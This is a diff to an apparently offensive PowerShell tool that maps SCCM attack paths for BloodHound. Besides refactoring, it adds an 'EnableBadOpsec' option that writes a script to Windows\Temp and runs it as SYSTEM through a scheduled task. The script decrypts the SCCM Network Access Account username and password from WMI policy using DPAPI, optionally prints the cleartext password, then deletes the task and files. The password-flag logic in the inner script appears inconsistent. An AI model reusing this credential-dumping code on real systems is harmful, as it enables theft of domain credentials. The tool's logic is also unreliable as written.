@@ -33,17 +33,14 @@ Limitations:
     - I'm not a hooking expert, so if you see crashes during MSSQL collection due to the InitializeSecurityContextW hooking method that's totally vibe-coded, disable it. The hooking function doesn't work in PowerShell v7+ due to lack of support for certain APIs.
 
 In Progress / To Do:
-    - Unprivileged unit testing
-    - Memory/disk usage monitoring functions
     - Entity panels
     - Get members of groups with permissions on System Management container
-    - Should TAKEOVER-4 be added (not always traversable)?
-    - Clean up unused post-processing and ingest functions
     - Test with SQL on non-standard port
     - Remove hardcoded port 1433 from AdminService collection
     - Relay management point computer accounts to site databases
     - Secondary site databases
     - Group and user collection members
+    - Parse task sequences and collection variables for usernames and passwords during Local collection
     - DHCP collection (unauthenticated network access)
     - WMI collection (privileged, fallback if AdminService is not reachable)
     - CMPivot collection (privileged)
@@ -116,9 +113,6 @@ Specify a domain controller to use for DNS and AD object resolution
 .PARAMETER Credential
 Specify a PSCredential object for authentication
 
-.PARAMETER SkipPostProcessing
-Skip post-processing edge creation (creates only direct edges from collection)
-
 .PARAMETER DisablePossibleEdges
 Switch/Flag:
     - Off (default): Make the following edges traversable (useful for offensive engagements but extends duration and is prone to false positive edges that may not be abusable):
@@ -126,6 +120,16 @@ Switch/Flag:
         - MSSQL_*: Assume any targeted MSSQL Server instances are site database servers, which may create false positives if MSSQL is installed on SCCM-related targets for other purposes, otherwise use Remote Registry collection to confirm
         - SameHostAs: Systems with the CmRcService SPN are treated as client devices in the root site for the forest (may be false positive if SCCM client was removed after remote control was used)
     - On: The edges above are not created or are created as non-traversable to reduce false positives at the expense of possible edges
+
+.PARAMETER EnableBadOpsec
+Switch/Flag:
+    - Off (default): Do not create edges that launch cmd.exe/powershell.exe or access SYSTEM DPAPI keys on the system where ConfigManBearPig is executed (e.g., to dump and decrypt the NAA username)
+    - On: Create the edges above (WILL be detected by EDR/AV solutions)
+
+.PARAMETER ShowCleartextPasswords
+Switch/Flag:
+    - Off (default): Do not decrypt or display cleartext passwords
+    - On: Display cleartext passwords when they are discovered
 
 .PARAMETER Verbose
 Enable verbose output
@@ -162,9 +166,11 @@ param(
 
     [string]$DomainController,
     
-    [switch]$SkipPostProcessing,
-
     [switch]$DisablePossibleEdges,
+
+    [switch]$EnableBadOpsec,
+
+    [switch]$ShowCleartextPasswords,
 
     [switch]$Version
 )
@@ -1660,6 +1666,11 @@ function Invoke-PostProcessing {
                 # Account for duplicate objects created during global object identifier update -- BloodHound will merge on ObjectIdentifier
                 $adminUserNode = $sccmAdminUserNodes | Where-Object { $_.id -eq $adminUserId } | Select-Object -First 1
 
+                # Add to array property for the site
+                $null = Upsert-Node -Id $rootSite.id -Kinds @("SCCM_Site") -Properties @{
+                    adminUsers = @($adminUserNode.Name)
+                }
+
                 # Track whether admin has complete control of the hierarchy
                 $adminIsFullAdministrator = $securityRoleNode.id -eq "SMS0001R@$($rootSiteCode)"
                 $allSystemsAllObjectsAllUsersAndUserGroups = @()
@@ -1799,8 +1810,22 @@ function Invoke-PostProcessing {
                 if ($siteCodeForSiteSystem) {
                     $primarySiteForSiteSystem = $sccmSiteNodes | Where-Object { $_.Id -eq $siteCodeForSiteSystem -and $_.Type -ne "Secondary Site" }
 
-                    # Add AdminTo edges from site servers to all the other site systems in primary sites (temporarily LocalAdminRequired due to lack of OpenGraph support for post-processed edges)
                     if ($primarySiteForSiteSystem) {
+
+                        # Initialize the siteSystemRoles property if it doesn't exist
+                        if (-not $primarySiteForSiteSystem.Properties.ContainsKey("siteSystemRoles")) {
+                            $primarySiteForSiteSystem.Properties["siteSystemRoles"] = @()
+                        }
+                        
+                        # Add the computer to the list if it's not already there
+                        if ($computerNode.Properties.dNSHostName -notin $primarySiteForSiteSystem.Properties["siteSystemRoles"]) {
+                            foreach ($role in $computerNode.Properties["SCCMSiteSystemRoles"] | Where-Object { $_ -like "*@$($primarySiteForSiteSystem.Id)" }) {
+                                $primarySiteForSiteSystem.Properties["siteSystemRoles"] += "$($computerNode.Properties.dNSHostName): $role"
+                            }
+                            Write-LogMessage Verbose "Added $($computerNode.Properties.dNSHostName): $role to siteSystemRoles for site $siteCodeForSiteSystem"
+                        }
+
+                        # Add AdminTo edges from site servers to all the other site systems in primary sites (temporarily LocalAdminRequired due to lack of OpenGraph support for post-processed edges)
                         $siteServerComputerNodes = @($computerNodes | Where-Object { $_.properties.SCCMSiteSystemRoles -contains "SMS Site Server@$($primarySiteForSiteSystem.Id)" })
                         $siteDatabaseComputerNodes = @($computerNodes | Where-Object { $_.properties.SCCMSiteSystemRoles -contains "SMS SQL Server@$($primarySiteForSiteSystem.Id)" })
 
@@ -1866,48 +1891,6 @@ function Invoke-PostProcessing {
         }
     }
 
-    # Process Computer nodes again after site system roles are processed
-    foreach ($computerNode in $computerNodes) {
-
-        Write-LogMessage Verbose "Processing $($computerNode.id) ($($computerNode.Properties.name)) a second time"
-
-        # Process site system roles
-        if ($computerNode.Properties["SCCMSiteSystemRoles"]) {
-
-            # Extract all unique site codes from SCCMSiteSystemRoles
-            $siteCodes = @($computerNode.Properties["SCCMSiteSystemRoles"] | ForEach-Object {
-                if ($_ -match '@(.+)$') {
-                    $matches[1]
-                }
-            } | Select-Object -Unique)
-
-            # Loop through each site this computer hosts roles for
-            foreach ($siteCodeForSiteSystem in $siteCodes) {       
-
-                # Find the primary site for this site system
-                if ($siteCodeForSiteSystem) {
-                    $primarySiteForSiteSystem = $sccmSiteNodes | Where-Object { $_.Id -eq $siteCodeForSiteSystem -and $_.Type -ne "Secondary Site" }
-
-                    if ($primarySiteForSiteSystem) {
-
-                        # Initialize the siteSystemRoles property if it doesn't exist
-                        if (-not $primarySiteForSiteSystem.Properties.ContainsKey("siteSystemRoles")) {
-                            $primarySiteForSiteSystem.Properties["siteSystemRoles"] = @()
-                        }
-                        
-                        # Add the computer to the list if it's not already there
-                        if ($computerNode.Properties.dNSHostName -notin $primarySiteForSiteSystem.Properties["siteSystemRoles"]) {
-                            foreach ($role in $computerNode.Properties["SCCMSiteSystemRoles"] | Where-Object { $_ -like "*@$($primarySiteForSiteSystem.Id)" }) {
-                                $primarySiteForSiteSystem.Properties["siteSystemRoles"] += "$($computerNode.Properties.dNSHostName): $role"
-                            }
-                            Write-LogMessage Verbose "Added $($computerNode.Properties.dNSHostName): $role to siteSystemRoles for site $siteCodeForSiteSystem"
-                        }
-                    }
-                }
-            }
-        }
-    }
-
     # Loop through sites again to process relay and MSSQL_GetTGS edges after MSSQL nodes are all created
     foreach ($sccmSiteNode in $sccmSiteNodes) {
 
@@ -1921,7 +1904,7 @@ function Invoke-PostProcessing {
             Process-CoerceAndRelayToMSSQL -SiteCode $sccmSiteNode.Id
             
             # Add CoerceAndRelayToSMB edges for all site system roles
-        Process-CoerceAndRelayToSMB -SiteCode $sccmSiteNode.Id
+            Process-CoerceAndRelayToSMB -SiteCode $sccmSiteNode.Id
         }
     
         # Get MSSQL_Server nodes for this site and add MSSQL_GetTGS edges from MSSQL service accounts to every server login
@@ -3979,11 +3962,213 @@ function Invoke-LocalCollection {
             }
             
             # Also create/update the Computer node for the system running the collector
-            $null = Upsert-Node -Id $localTarget.ADObject.SID -Kinds @("Computer", "Base") -PSObject $localTarget.ADObject -Properties @{
+            $thisComputerNode = Upsert-Node -Id $localTarget.ADObject.SID -Kinds @("Computer", "Base") -PSObject $localTarget.ADObject -Properties @{
                 collectionSource = @("Local-CCM_Client")
                 name = $localTarget.ADObject.samAccountName
             }
         }
+
+        if ($EnableBadOpsec) {
+            try {
+                Write-LogMessage Warning "Bad OPSEC enabled... attempting to decrypt SCCM network access account (NAA) username"
+
+                # -----------------------------
+                # Paths and task name
+                # -----------------------------
+                $baseDir    = "C:\Windows\Temp"
+                $scriptPath = Join-Path $baseDir "Decrypt-NAA.ps1"
+                $outputPath = Join-Path $baseDir "Decrypt-NAA.out"
+                $taskName   = "SCCM_Decrypt_NAA"
+
+                Write-LogMessage Warning "Writing the decryption script to $scriptPath and deleting after execution"
+                Write-LogMessage Warning "Output will be written to $outputPath then deleted after reading"
+                Write-LogMessage Warning "Creating scheduled task $taskName to run decryption script as SYSTEM then deleting after execution"
+
+                # -----------------------------
+                # Write decrypt script to disk
+                # -----------------------------
+@'
+    # Credit: Tom Degreef and Kim Oppalfens
+
+    # Ensure DPAPI types are available (REQUIRED under SYSTEM)
+    Add-Type -AssemblyName System.Security
+
+    $SCCMSecret = Get-CimInstance `
+        -ClassName CCM_NetworkAccessAccount `
+        -Namespace root\ccm\policy\machine\actualconfig
+    
+    $DecryptedUsernames = @()
+    $DecryptedPasswords = @()
+
+    foreach ($secret in $SCCMSecret) {
+
+        # -------- Username --------
+        $EncodedString = $secret.NetworkAccessUserName.Split('[')[2].Split(']')[0]
+        $Array = New-Object Byte[] ($EncodedString.Length / 2)
+
+        for ($i = 0; $i -lt ($EncodedString.Length / 2 - 4); $i++) {
+            $Array[$i] = [Convert]::ToByte(
+                $EncodedString.Substring(($i + 4) * 2, 2), 16
+            )
+        }
+
+        $DecryptedUsername = [System.Text.Encoding]::Unicode.GetString(
+            [System.Security.Cryptography.ProtectedData]::Unprotect(
+                $Array,
+                $null,
+                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+            )
+        ).Trim([char]0)
+
+        $DecryptedUsernames += $DecryptedUsername
+        
+        # -------- Password --------
+        if ($ShowCleartextPasswords) {
+            continue
+        }
+
+        $EncodedString = $secret.NetworkAccessPassword.Split('[')[2].Split(']')[0]
+        $Array = New-Object Byte[] ($EncodedString.Length / 2)
+
+        for ($i = 0; $i -lt ($EncodedString.Length / 2 - 4); $i++) {
+            $Array[$i] = [Convert]::ToByte(
+                $EncodedString.Substring(($i + 4) * 2, 2), 16
+            )
+        }
+
+        $Password = [System.Text.Encoding]::Unicode.GetString(
+            [System.Security.Cryptography.ProtectedData]::Unprotect(
+                $Array,
+                $null,
+                [System.Security.Cryptography.DataProtectionScope]::CurrentUser
+            )
+        ).Trim([char]0)
+
+        $DecryptedPasswords += $Password
+    }
+    $DecryptedUsernames | ConvertTo-Json -Compress |
+        ForEach-Object { Write-Output "NAA_USERNAMES=$_"}
+    $DecryptedPasswords | ConvertTo-Json -Compress |
+        ForEach-Object { Write-Output "NAA_PASSWORDS=$_"}
+'@ | Set-Content -Encoding UTF8 -Path $scriptPath
+
+                # -----------------------------
+                # Scheduled task action
+                # (cmd.exe required for redirection)
+                # -----------------------------
+                $args = ""
+                if ($ShowCleartextPasswords) { 
+                    $args = " -ShowCleartextPasswords" 
+                } 
+
+                $action = New-ScheduledTaskAction `
+                    -Execute "cmd.exe" `
+                    -Argument "/c powershell.exe -NoProfile -ExecutionPolicy Bypass -File `"$scriptPath`"$args > `"$outputPath`" 2>&1"
+
+                $principal = New-ScheduledTaskPrincipal `
+                    -UserId "SYSTEM" `
+                    -LogonType ServiceAccount `
+                    -RunLevel Highest
+
+                Register-ScheduledTask `
+                    -TaskName $taskName `
+                    -Action $action `
+                    -Principal $principal `
+                    -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date)) `
+                    -Force | Out-Null
+
+                # -----------------------------
+                # Run task
+                # -----------------------------
+                Start-ScheduledTask -TaskName $taskName
+
+                # -----------------------------
+                # Wait for completion
+                # -----------------------------
+                do {
+                    Start-Sleep -Milliseconds 1000
+                    $state = (Get-ScheduledTask -TaskName $taskName |
+                            Get-ScheduledTaskInfo).State
+                } while ($state -eq 'Running')
+
+                # -----------------------------
+                # Display output
+                # -----------------------------
+                if (Test-Path $outputPath) {
+                    $usernames = (Get-Content $outputPath |
+                        Where-Object { $_ -like 'NAA_USERNAMES=*' }
+                    ).Substring(14) | ConvertFrom-Json
+                    if (-not $usernames) {
+                        $usernames = @()
+                        Write-LogMessage Warning "Failed to decrypt network access account username"
+                    }
+                    foreach ($username in $usernames) {
+                        Write-LogMessage Success "Decrypted network access account username: $username"
+                        # Check if username has domain short name in it
+                        if ($username -match "^(?<Domain>[^\\]+)\\(?<User>.+)$") {
+                            $userPart   = $matches['User'].ToString()
+                            $domainPart = $matches['Domain']
+
+                            # Resolve to domain principal
+                            $naaPrincipal = Resolve-PrincipalInDomain -Name $userPart -Domain $domainPart
+                            if (-not $naaPrincipal) {
+                                $naaPrincipal = Resolve-PrincipalInDomain -Name $userPart -Domain $script:Domain
+                            }
+                            if ($naaPrincipal) {
+                                Write-LogMessage Success "Resolved NAA username to AD object: $($naaPrincipal.SID)"
+
+                                # Upsert user node
+                                $null = Upsert-Node -Id $naaPrincipal.SID -Kinds @("User", "Base") -PSObject $naaPrincipal -Properties @{
+                                    collectionSource = @("Local-DecryptSecrets")
+                                    name = $naaPrincipal.SamAccountName
+                                    isSCCMNetworkAccessAccount = $true
+                                }
+
+                                if (-not $DisablePossibleEdges) {
+                                    Upsert-Edge -Start $thisComputerNode.Id -Kind "SCCM_HasNetworkAccessAccount" -End $naaPrincipal.SID -Properties @{
+                                        collectionSource = @("Local-DecryptSecrets")
+                                    }
+                                }
+                            } else {
+                                Write-LogMessage Warning "Failed to resolve NAA username to AD object: $username"
+                            }
+                        }
+                    }
+                    if ($ShowCleartextPasswords) {
+                        $passwords = (Get-Content $outputPath |
+                            Where-Object { $_ -like 'NAA_PASSWORDS=*' }
+                        ).Substring(14) | ConvertFrom-Json
+                        if (-not $passwords) {
+                            $passwords = @()
+                            Write-LogMessage Warning "Failed to decrypt network access account password"
+                        }
+                        foreach ($password in $passwords) {
+                            Write-LogMessage Success "Decrypted network access account password: $password"
+                        }
+                    }
+                } else {
+                    Write-LogMessage Warning "Output file not found"
+                }
+
+                # -----------------------------
+                # Cleanup
+                # -----------------------------
+                try { 
+                    Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
+                    Write-LogMessage Info "Unregistered scheduled task $taskName"
+                } catch {
+                    Write-LogMessage Error "Failed to unregister scheduled task $taskName"
+                }
+                try {
+                    Remove-Item -Path $scriptPath, $outputPath -Force -ErrorAction SilentlyContinue
+                    Write-LogMessage Info "Deleted temporary files $scriptPath and $outputPath"
+                } catch {
+                    Write-LogMessage Error "Failed to delete temporary files"
+                }
+            } catch {
+                Write-LogMessage Error "NAA decryption failed: $_"
+            }
+        }       
         
         # Search SCCM client log data for UNC paths and URLs that are likely to be SCCM components
         Write-LogMessage Info "Searching SCCM client logs for additional SCCM components..."
@@ -7529,7 +7714,7 @@ function Get-AdminUsersViaAdminService {
                             # Add role to admin user's memberOf property
                             $null = Upsert-Node -Id "$($admin.LogonName)@$rootSiteCode" -Kinds @("SCCM_AdminUser") -Properties @{
                                 collectionSource = @("AdminService-SMS_Admin")
-                                memberOf = @($role.Id)
+                                memberOf = @("$($role.Id) ($($role.properties.roleName))")
                             }
 
                             # Add admin user to role's members property
@@ -9706,6 +9891,18 @@ try {
     # Process each specified method
     foreach ($method in $collectionMethodsSplit) {
         switch ($method) {
+            "" {
+                $enableLDAP = $true
+                $enableLocal = $true
+                $enableDNS = $true
+                $enableDHCP = $true
+                $enableRemoteRegistry = $true
+                $enableMSSQL = $true
+                $enableAdminService = $true
+                $enableWMI = $true
+                $enableHTTP = $true
+                $enableSMB = $true
+            }
             "ALL" {
                 $enableLDAP = $true
                 $enableLocal = $true
